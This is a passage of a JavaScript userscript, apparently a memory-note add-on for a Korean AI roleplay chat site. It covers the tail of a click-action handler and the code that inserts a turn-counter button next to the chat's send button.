      case 'npcrange': nav.rgKind = 'npc'; nav.bdRange = true; return keepScroll(render);
      case 'pcmake': nav.rgKind = 'pc'; nav.rgWho = arg; nav.bdRange = true; return keepScroll(render);
      case 'devimg': return snapDevice(arg);
      case 'pcgo': nav.pcScreen = arg; return keepScroll(render);
      case 'bdmake': { const a = Number(out('bdFrom')?.value) || 0, b = Number(out('bdTo')?.value) || 0; if (a > b) { toast('앞 턴이 뒤 턴보다 커요.', 'err'); return; }
        const k = nav.rgKind || 'board', who = nav.rgWho, ex = k === 'phone' ? phoneData[who] : k === 'pc' ? pcData[who] : boardData;
        const lab = k === 'phone' ? `${who}의 폰` : k === 'pc' ? `${who}의 컴퓨터` : '커뮤니티';
        if (k === 'quote') { nav.bdRange = false; return makeQuotes(a, b, nav.qWho || ''); }
        if (k === 'npc') { nav.bdRange = false; return findNpc(a, b); }
        if (k === 'wiki') { if (wikiData && !confirm(a + '~' + b + '턴 대화를 참고해서 위키를 다시 만들까요? (AI를 1번 불러요)')) return; nav.bdRange = false; return makeWiki(a, b); }
        if (k === 'live' && b - a + 1 > 5) { toast('실시간톡은 한 화에 최대 5턴이에요 (추천 2턴).', 'err', 3000); return; }
        if (k === 'live') { if (liveData && !confirm(a + '~' + b + '턴으로 실시간톡을 처음부터 다시 만들까요? (지난 화가 지워져요)')) return; nav.bdRange = false; return makeLive(a, b); }
        if (k === 'news') { if (newsData && !confirm(`${a}~${b}턴 대화를 참고해서 뉴스를 다시 만들까요? (AI를 1번 불러요)`)) return; nav.bdRange = false; return makeNews(a, b); }
        if (ex && !confirm(`${a}~${b}턴 대화를 참고해서 ${lab}을(를) 다시 만들까요? (AI를 1번 불러요)`)) return;
        nav.bdRange = false; return k === 'phone' ? makePhone(who, a, b) : k === 'pc' ? makePc(who, a, b) : makeBoard(a, b); }
      case 'bdgo': nav.bdReplyTo = null; nav.bdPost = arg === '' ? null : Number(arg); nav.bdWho = null; return keepScroll(render);
      case 'noop': return;
      case 'bdvote': await bdVote(arg); return keepScroll(render);
      case 'bdcmt': return bdComment();
      case 'dropname': if (draft) { draft.sections = dropNames(draft.sections, arg ? [arg] : draft.madeUp || []); draft.madeUp = (draft.madeUp || []).filter(w => arg && w !== arg); } return keepScroll(render);
      case 'bdanon': nav.bdAnon = el.checked; { const keep = out(nav.bdReplyTo != null ? 'bdCmtR' : 'bdCmt')?.value || ''; keepScroll(render); const i = out(nav.bdReplyTo != null ? 'bdCmtR' : 'bdCmt'); if (i) i.value = keep; } return;
      case 'bdrep': nav.bdReplyTo = arg === '' || nav.bdReplyTo === Number(arg) ? null : Number(arg); // 같은 답글을 한 번 더 누르면 닫힘
        keepScroll(render); setTimeout(() => out(nav.bdReplyTo == null ? 'bdCmt' : 'bdCmtR')?.focus({ preventScroll: true }), 30); return;
      case 'bdrange': nav.bdRange = !nav.bdRange; if (nav.bdRange) nav.rgKind = 'board'; return keepScroll(render);
      case 'imgclose': nav.bdImg = null; return keepScroll(render);
      case 'inject': return toggleInject();
      case 'bdimg': return snapBoard();
      case 'bdrefresh': return refreshBoard(arg || '');
      case 'bdpage': { const [b, n] = arg.split('|'); (nav.bdPage || (nav.bdPage = {}))[b] = Number(n) || 1; return keepScroll(render); }
      case 'bddel': { const [k, ...v] = arg.split(':'), a = v.join(':'), d = boardData?.data; if (!d) return;
        if (k === 'post') { const p = d.posts[Number(a)]; if (!p || !confirm(`'${p.title || ''}' 글을 지울까요?`)) return; d.posts.splice(Number(a), 1); nav.bdPost = null; }
        else { if (!confirm(`'${a}' 게시판의 글을 모두 지울까요?`)) return; d.posts = d.posts.filter(p => p.board !== a); }
        await setValue('board:' + chatIdFromPath(), JSON.stringify(boardData)); toast('지웠어요', 'ok', 1800); return keepScroll(render); }
      case 'bdboard': nav.bdBoard = arg; nav.bdPost = null; nav.bdWho = null; return keepScroll(render);
      case 'bdwho': { const sn = nav.bdSeen || (nav.bdSeen = new Set()); sn.has(arg) ? sn.delete(arg) : sn.add(arg); return keepScroll(render); }
      case 'pcunlock': nav.pcOpen = nav.phWho; return keepScroll(render);
      case 'phupd': return makePhone(arg, 0, 0, true);
      case 'pcupd': return makePc(arg, 0, 0, true);
      case 'phmake': nav.rgKind = 'phone'; nav.rgWho = arg; nav.bdRange = true; return keepScroll(render);
      case 'phapp': nav.phScreen = arg; return keepScroll(render);
      case 'phgo': nav.phScreen = arg; return keepScroll(render);
      case 'phunlock': nav.phUnlock = arg; toast('Face ID 확인됨 🔓', 'ok', 1200); return keepScroll(render);
      case 'phhome': nav.phScreen = 'home'; return keepScroll(render);
      case 'phback': { const sc = nav.phScreen || 'home'; const BACK = { sys: 'home', xapp: 'home', post: 'insta', dm: 'insta', dmt: 'dm', thread: 'msg', note: 'memo', photo: 'album', item: 'market', secret: 'memo', snote: 'secret' }; nav.phScreen = BACK[sc.split(':')[0]] || 'home'; return keepScroll(render); }
      case 'tlperson': nav.view = null; nav.tab = 'timeline'; nav.tlWho = arg; render(); out('main').scrollTop = 0; return;
      case 'restore': {
        const h = histList[Number(arg)]; if (!h || busyNow) return;
        if (!confirm(`${h.from + 1}~${h.to}턴 정리 전 노트(1~${h.from}턴)로 되돌릴까요? 미리보기에서 확인한 뒤 넣어요. 그 뒤 대화는 다음 정리 때 다시 정리돼요.`)) return;
        draft = { sections: splitSections(h.before), uptoId: h.beforeUpto, turns: h.from, evidence: { ok: 0, bad: 0 }, kept: [], lost: [], restore: true,
          sub: `${h.from + 1}~${h.to}턴을 정리하기 전 노트예요. 넣으면 다음 정리 때 그 뒤 대화를 다시 정리해요.` };
        nav.view = 'preview'; render(); out('main').scrollTop = 0; return;
      }
      case 'runsheet': {
        if (nav.lostAsk && nav.lostAsk.chatId === chatIdFromPath() && (nav.lostAsk.local || nav.lostAsk.g)) {
          nav.tab = 'home'; nav.view = null; render();
          return toast('사라진 기억을 먼저 위 카드에서 다시 넣어 주세요. 새로 정리하려면 "그냥 두기"를 누른 뒤 정리하기를 눌러요.', 'info', 6000);
        }
        const m = String(await getValue('model', DEFAULT_MODEL));
        nav.modelLabel = MODELS.flatMap(([g, l]) => l.map(([id, lb]) => [id, `${g} ${lb}`])).find(([id]) => id === m)?.[1] || m;
        nav.hasKey = !!String(await getValue(isClaude(m) ? 'claudeKey' : 'apiKey', '')).trim();
        nav.runBy = nav.hasKey && String(await getValue('runBy', 'api')) !== 'file' ? 'api' : 'file';
        nav.runMode = 'new';
        // 키가 있으면 '정리하기'는 고르는 창 없이 바로 이어서 정리합니다. 키가 없거나 '다른 방법'을 누를 때만 창을 띄워요.
        if (nav.hasKey && !arg) return run('new');
        nav.view = 'run'; render(); out('main').scrollTop = 0; return;
      }
      case 'runBy': nav.runBy = arg; await setValue('runBy', arg); return render();
      case 'runMode': nav.runMode = arg; return render();
      case 'backup': return exportBackup();
      case 'gsave': return gsSave();
      case 'gload': return gsLoad();
      case 'gscode': return gsCopyCode();
      case 'gsopen': nav.etcSyncOn = String(await getValue('etcSync', 'off')) === 'on'; nav.gsSheet = true; render(); return fillSettings();
      case 'gsclose': nav.gsSheet = false; return render();
      case 'gskeep': return gsKeep();
      case 'etcopen': nav.etcSheet = true; return render();
      case 'etcclose': nav.etcSheet = false; return render();
      case 'etcwipe': return etcWipe(arg);
      case 'etcpull': return etcPull(true);
      case 'etcskip': return etcPull(false);
      case 'etcsync': await setValue('etcSync', el.checked ? 'on' : 'off'); nav.etcSyncOn = el.checked; toast(el.checked ? 'ETC도 기기끼리 맞춰요. 바뀌면 구글에 자동으로 올라가요.' : 'ETC는 기기마다 따로 둬요.', 'ok', 3000); if (el.checked) etcFirst(); return;
      case 'devkeep': return devChoose(false);
      case 'lostput': return lostPut(arg || 'local');
      case 'fullget': { const f = nav.fullAsk; if (f && f.chatId === chatIdFromPath()) { await saveFull(f.chatId, f.n.upto, f.g.memory, f.n.turns, f.n.at); nav.fullAsk = null; toast('근거·감정선 전체를 받아 왔어요', 'ok', 2500); } return render(); }
      case 'fullskip': { const f = nav.fullAsk; if (f) await setValue('fullSkip:' + f.chatId, f.key); nav.fullAsk = null; return render(); }
      case 'lostskip': { const l = nav.lostAsk; if (l) await setValue('lostSkip:' + l.chatId, l.key); nav.lostAsk = null; return render(); }
      case 'devrestore': return devChoose(true);
      case 'reset': return resetMemory();
      case 'go': { const mode = nav.runMode; nav.view = null; nav.tab = 'home'; return run(mode); }
      case 'extget': return run(nav.runMode, { export: true });
      case 'center': nav.center = arg; return keepScroll(render);
      case 'castpick': nav.view = 'person'; nav.key = arg; render(); out('main').scrollTop = 0; return;
      case 'person': nav.view = 'person'; nav.key = arg; render(); out('main').scrollTop = 0; return;
      case 'edit': nav.prevView = nav.view; nav.prevKey = nav.key; nav.view = 'edit'; nav.key = arg; render(); return;
      case 'pvEdit': nav.view = 'pvEdit'; nav.key = arg; render(); return;
      case 'back':
        if (nav.view === 'preview') { if (!confirm('정리한 결과를 버릴까요?')) return; draft = null; nav.view = null; }
        else if (nav.view === 'pvEdit') nav.view = 'preview';
        else if (nav.view === 'edit') { nav.view = nav.prevView || null; nav.key = nav.prevKey || null; }
        else nav.view = null;
        return render();
      case 'saveEdit': return saveEdit();
      case 'apply': return apply();
      case 'save': return saveSettings();
    }
  });

  // ══════════════════════════════════════════════════════════════
  // 14. 채팅 입력창 버튼 줄에 "기억" 버튼 넣기
  //   입력창 근처에서 버튼이 여러 개 모인 줄을 찾아 붙이고, 못 찾으면 떠 있는 버튼을 씁니다.
  // ══════════════════════════════════════════════════════════════
  // 보내기 버튼 바로 왼쪽에 들어가는 둥근 버튼: 링이 차오르고 가운데 숫자는 다음 정리까지 남은 턴.
  const inlineBtn = document.createElement('button');
  inlineBtn.type = 'button';
  inlineBtn.id = 'memo-note-inline';
  inlineBtn.setAttribute('aria-label', '조아메모리 열기');
  // 크기를 줄이고(30px) 테두리 없이 링만 그립니다. 다른 버튼 줄을 밀어내지 않게 크기를 고정해요.
  inlineBtn.style.cssText = 'all:unset;box-sizing:border-box;flex:0 0 30px;width:30px;height:30px;min-width:30px;max-width:30px;margin:0 4px;' +
    'display:inline-flex;align-items:center;justify-content:center;position:relative;cursor:pointer;line-height:1;' +
    '-webkit-tap-highlight-color:transparent;align-self:center';
  inlineBtn.addEventListener('click', e => { e.preventDefault(); e.stopPropagation(); toggleSheet(); });
  function paintInlineButton(_label, due) {
    const turns = snapshot ? Math.min(freshTurns(), cycle) : 0, left = Math.max(0, cycle - turns);
    const r = 12.5, c = 2 * Math.PI * r, p = snapshot ? turns / cycle : 0;
    inlineBtn.setAttribute('aria-label', snapshot ? (due ? '조아메모리 · 정리할 때예요' : `조아메모리 · 다음 정리까지 ${left}턴`) : '조아메모리 열기');
    const over = snapshot ? Math.max(0, freshTurns() - cycle) : 0;
    const txt = !snapshot ? '' : over ? '+' + over : due ? '✓' : String(left);
    inlineBtn.innerHTML = `<svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true" style="display:block;position:absolute;inset:0">
        <circle cx="15" cy="15" r="${r}" fill="${due ? '#E6E0FA' : 'none'}" stroke="#E2E2E8" stroke-width="2"/>
        <circle cx="15" cy="15" r="${r}" fill="none" stroke="${due ? '#9D8CEB' : '#55536A'}" stroke-width="2" stroke-linecap="round"
          stroke-dasharray="${(c * p).toFixed(2)} ${c.toFixed(2)}" transform="rotate(-90 15 15)"/></svg>
      <span style="position:relative;font:700 ${txt.length > 1 ? 10.5 : 11.5}px/1 -apple-system,system-ui,sans-serif;color:${due ? '#4B3F8A' : '#3A3946'};letter-spacing:-.3px">${txt}</span>`;
  }
  paintInlineButton('', false);

  // 크랙 입력창 찾기: textarea·글 입력 칸 둘레에서 버튼이 3개 이상 모인 상자를 찾고,
  // 그 안에서 가장 오른쪽(보내기) 버튼 바로 앞에 끼워 넣습니다.
  function findSendSpot() {
    const inputs = [...document.querySelectorAll('textarea, [contenteditable="true"], [role="textbox"]')]
      .filter(t => !host.contains(t) && t.offsetParent !== null && t.getBoundingClientRect().width > 120);
    const box0 = inputs.sort((a, b) => b.getBoundingClientRect().bottom - a.getBoundingClientRect().bottom)[0];
    if (!box0) return null;
    let box = box0.parentElement;
    for (let i = 0; i < 8 && box; i++, box = box.parentElement) {
      const btns = [...box.querySelectorAll('button')].filter(b => b !== inlineBtn && b.offsetParent !== null && !host.contains(b));
      if (btns.length < 3) continue;
      const send = btns.reduce((best, b) => {
        const r = b.getBoundingClientRect(), br = best.getBoundingClientRect();
        return r.right > br.right + 1 || (Math.abs(r.right - br.right) <= 1 && r.bottom > br.bottom) ? b : best;
      });
      // 보내기 버튼이 혼자 감싸져 있으면 그 감싼 상자 앞에 넣습니다.
      let anchor = send;
      while (anchor.parentElement && anchor.parentElement !== box && anchor.parentElement.querySelectorAll('button').length === 1) anchor = anchor.parentElement;
      return anchor;
    }
    return null;
  }
  function placeInlineButton() {
    if (!chatIdFromPath()) { inlineBtn.remove(); ui('.fab').classList.remove('show'); return; }
    if (!inlineBtn.isConnected) { const anchor = findSendSpot(); if (anchor?.parentElement) anchor.parentElement.insertBefore(inlineBtn, anchor); }
    ui('.fab').classList.toggle('show', !inlineBtn.isConnected);
  }
  let placeTimer = null;
  new MutationObserver(() => {
    if (inlineBtn.isConnected || placeTimer) return;
    placeTimer = setTimeout(() => { placeTimer = null; placeInlineButton(); }, 400);
  }).observe(document.documentElement, { childList: true, subtree: true });

  // 방을 옮기면 초기화하고 가볍게 다시 확인
  (async () => {
    const c = Number(await getValue('cycle', '25')); if (CYCLES.includes(c)) cycle = c;
    const l = Number(await getValue('noteLimit', '30000')); if (LIMITS.includes(l)) NOTE_LIMIT = l;
  })();
  // 다른 앱·탭에 갔다가 돌아오면(아이폰 사파리 포함) 채팅의 노트를 다시 읽어 다른 기기에서 넣은 새 노트로 갈아끼웁니다.
  let backAt = 0;
  const comeBack = () => { if (document.visibilityState !== 'visible' || !chatIdFromPath() || busyNow || loading || Date.now() - backAt < 5000) return; backAt = Date.now(); refresh(); };
  document.addEventListener('visibilitychange', comeBack);
  window.addEventListener('pageshow', comeBack);
  window.addEventListener('focus', comeBack);
  let lastPath = '';
  setInterval(() => {
    if (location.pathname === lastPath) return;
    lastPath = location.pathname;
    openSheet(false);
    snapshot = null; draft = null; nav = fresh();
    inlineBtn.remove();
    placeInlineButton();
    render();
    if (chatIdFromPath()) setTimeout(() => refresh(), 1500);
  }, 1000);
})();
